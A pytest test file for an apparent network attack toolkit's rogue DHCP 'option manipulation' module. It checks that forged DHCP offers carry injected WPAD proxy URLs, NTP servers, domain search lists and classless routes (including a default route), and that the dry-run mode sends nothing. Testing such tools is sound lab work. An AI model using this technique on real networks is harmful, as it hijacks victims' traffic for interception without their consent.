import threading

import pytest
from scapy.all import BOOTP, DHCP, IP, UDP, Ether

from macabre.attacks.dhcp_option_manipulation import (
    DhcpOptionManipulationConfig,
    OPTION_CLASSLESS_ROUTES,
    OPTION_DOMAIN_SEARCH,
    OPTION_NTP_SERVER,
    OPTION_WPAD,
    build_extra_options,
    encode_classless_routes,
    encode_domain_search,
    run_dhcp_option_manipulation,
)
from macabre.attacks.rogue_dhcp_server import RogueDhcpConfig, build_offer

SERVER_MAC = "02:00:00:00:00:02"
SERVER_IP = "10.99.0.1"


def config(**overrides):
    values = dict(iface="eth0", server_ip=SERVER_IP, server_mac=SERVER_MAC, offer_ip="10.99.0.150")
    values.update(overrides)
    return DhcpOptionManipulationConfig(**values)


def test_domain_search_uses_dns_labels_with_zero_terminators():
    assert encode_domain_search("lab.example") == b"\x03lab\x07example\x00"
    assert encode_domain_search("a.b, c.d") == b"\x01a\x01b\x00\x01c\x01d\x00"


def test_classless_routes_use_significant_octets_only():
    assert encode_classless_routes("198.51.100.0/24=10.99.0.254") == bytes.fromhex("18c633640a6300fe")
    assert encode_classless_routes("0.0.0.0/0=10.99.0.254") == b"\x00" + bytes.fromhex("0a6300fe")


@pytest.mark.parametrize("routes", ["198.51.100.0=10.99.0.254", "198.51.100.0/33=10.99.0.254", "x/24=1.1.1.1"])
def test_bad_routes_are_refused(routes):
    with pytest.raises(ValueError):
        encode_classless_routes(routes)


@pytest.mark.parametrize("overrides", [
    dict(ntp_server="not-an-ip"),
    dict(domain_search="bad..label"),
    dict(wpad_url="x" * 256),
    dict(classless_routes="198.51.100.0/24=nope"),
])
def test_bad_options_are_refused_when_the_config_is_built(overrides):
    with pytest.raises(ValueError):
        config(**overrides)


def test_only_selected_options_are_built_in_code_order():
    options = build_extra_options(config(wpad_url="http://10.99.0.5/wpad.dat", ntp_server="10.99.0.9"))
    assert [code for code, _ in options] == [OPTION_NTP_SERVER, OPTION_WPAD]
    assert options[1][1] == b"http://10.99.0.5/wpad.dat"
    assert build_extra_options(config()) == ()


def test_selected_options_appear_in_the_offer():
    options = build_extra_options(config(
        wpad_url="http://10.99.0.5/wpad.dat",
        domain_search="lab.example",
        classless_routes="198.51.100.0/24=10.99.0.254",
    ))
    rogue = RogueDhcpConfig(iface="eth0", server_ip=SERVER_IP, offer_ip="10.99.0.150", extra_options=options)
    discover = Ether(src="02:00:00:00:00:50") / IP() / UDP(sport=68, dport=67) / BOOTP(
        op=1, xid=7, chaddr=bytes.fromhex("020000000050").ljust(16, b"\x00")
    ) / DHCP(options=[("message-type", "discover"), "end"])
    offer = build_offer(rogue, SERVER_MAC, discover)
    codes = {o[0] for o in offer[DHCP].options if isinstance(o, tuple)}
    assert {OPTION_WPAD, OPTION_DOMAIN_SEARCH, OPTION_CLASSLESS_ROUTES} <= codes
    values = {o[0]: o[1] for o in offer[DHCP].options if isinstance(o, tuple)}
    assert values[OPTION_WPAD] == b"http://10.99.0.5/wpad.dat"
    assert offer[DHCP].options[-1] == "end"


def test_run_sends_replies_only_when_a_client_asks():
    sent = []

    class Sniffer:
        def __init__(self, **kw):
            self.prn = kw["prn"]
        def start(self):
            discover = Ether(src="02:00:00:00:00:50") / IP() / UDP(sport=68, dport=67) / BOOTP(
                op=1, xid=9, chaddr=bytes.fromhex("020000000050").ljust(16, b"\x00")
            ) / DHCP(options=[("message-type", "discover"), "end"])
            self.prn(discover)
        def stop(self):
            pass

    stop = threading.Event()
    stats = run_dhcp_option_manipulation(
        config(wpad_url="http://10.99.0.5/wpad.dat"),
        stop,
        lambda s: stop.set(),
        send=lambda frame, **kw: sent.append(frame),
        sniffer_factory=Sniffer,
    )
    assert stats.offers == 1
    assert len(sent) == 1
    assert sent[0][DHCP].options[0] == ("message-type", "offer")
    assert any(o[0] == OPTION_WPAD for o in sent[0][DHCP].options if isinstance(o, tuple))


def test_dry_run_sends_nothing():
    sent = []
    stats = run_dhcp_option_manipulation(
        config(dry_run=True, wpad_url="http://10.99.0.5/wpad.dat"), threading.Event(), lambda s: None,
        send=lambda *a, **kw: sent.append(a), sniffer_factory=lambda **kw: None,
    )
    assert sent == []
    assert "Nothing sent" in stats.status
